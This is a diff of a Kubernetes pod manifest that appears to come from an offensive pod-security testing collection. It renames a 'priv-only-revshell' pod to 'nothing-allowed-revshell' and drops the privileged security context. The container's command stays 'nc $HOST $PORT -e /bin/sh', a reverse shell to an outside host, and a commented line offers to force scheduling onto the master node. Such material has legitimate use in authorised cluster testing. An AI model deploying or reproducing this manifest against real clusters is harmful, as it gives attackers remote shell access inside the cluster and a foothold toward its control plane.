@@ -1,22 +1,19 @@
 ###########################################################
-## Deploy: kubectl -n [namespace] apply -f pod-priv-only.yaml 
-## Access: kubectl -n [namespace] exec -it pod-priv-only -- bash
-## Remove: kubectl -n [namespace] delete -f pod-priv-only.yaml
+## Deploy: kubectl -n [namespace] apply -f pod-nothing-allowed.yaml 
+## Access: kubectl -n [namespace] exec -it pod-nothing-allowed -- bash
+## Remove: kubectl -n [namespace] delete -f pod-nothing-allowed.yaml
 ###########################################################
 apiVersion: v1
 kind: Pod
 metadata:
-  name: pod-priv-only-revshell
+  name: pod-nothing-allowed-revshell
   labels: 
-    app: priv-only-revshell
+    app: nothing-allowed-revshell
 spec:
   containers:
-  - name: priv-only-revshell
+  - name: nothing-allowed-revshell
     image: busybox
     command: [ "/bin/sh", "-c", "--" ]
     args: [ "nc $HOST $PORT  -e /bin/sh;" ]
-
-    securityContext:
-      privileged: true
   # Force scheduling of your pod on master mode by uncommenting this line and changing the name
   #nodeName: k8s-master
